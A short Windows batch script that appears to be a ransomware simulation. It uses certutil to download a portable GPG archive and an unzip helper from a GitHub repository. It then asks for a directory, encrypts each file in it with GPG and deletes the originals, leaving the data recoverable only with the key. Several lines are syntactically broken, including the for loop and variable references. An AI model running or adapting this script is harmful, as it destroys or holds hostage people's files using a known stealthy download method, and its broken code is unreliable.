@echo off
:: Download gpg zipped file and helpers

certutil.exe -urlcache -split -f https://raw.githubusercontent.com/jozems/sec/master/gpg_portable.zip
certutil.exe -urlcache -split -f https://raw.githubusercontent.com/jozems/sec/master/unzipfile.vbs

:: move files to c:\share
::move -y gpg_portable.zip c:\share
::move -y c:\share

:: unzip gpg_portable
unzipfile.vbs c:\share\gpg_portable.zip c:\share\gpg_extracted\

powershell write-host -back DarkRed [W] Next action is to encrypt files in directory indicated [any key to continue]
pause > null
:: ask for dir to encrypt
set /p dir_to_enc="Directory to encrypt:> "

:: encrypt files in dir
for %file in (%dir_to_enc\*) do gpg -r gpguser -e "%file" && del "%file" 
